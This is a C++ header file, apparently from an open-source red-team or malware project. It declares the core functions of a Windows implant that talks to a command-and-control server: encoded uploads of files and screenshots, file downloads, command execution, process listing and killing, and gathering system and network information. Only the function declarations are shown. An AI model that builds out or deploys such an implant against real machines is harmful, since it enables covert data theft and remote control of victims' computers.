#pragma once

#include<iostream>
#include <iomanip>
#include<Windows.h>
#include<WinInet.h>
#include <tchar.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include "Gdiplus.h"
#include <vector>

#include "util.h"
#include "config.h"

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "urlmon.lib")

// The core functions of the implant 
// Alll of these are either used for C2 <-> implant communication or executing a task from the C2

std::string sendEncodedString(std::string key, std::string data, std::string endpoint, HANDLE hConnect);
BOOL doFileUpload(HANDLE hConnect, char* filepath, int xorKey, std::string endpoint);
BOOL doScreenshotUpload(HANDLE hConnect, std::vector<BYTE> bmp, int xorKey, std::string endpoint);
BOOL doFileDownload(std::string url, std::string filepath);
std::string execCmd(std::string cmd, DWORD MAX_TIME);
std::string sendRequestGetResponse(HANDLE hRequest);
std::string getOSInfo();
std::string getPublicIP(HANDLE hInternet);
std::string getProcToStr();
BOOLEAN killProcess(DWORD pid);
std::string getNetworkInfo();
std::string gatherInfo(HANDLE hInternet);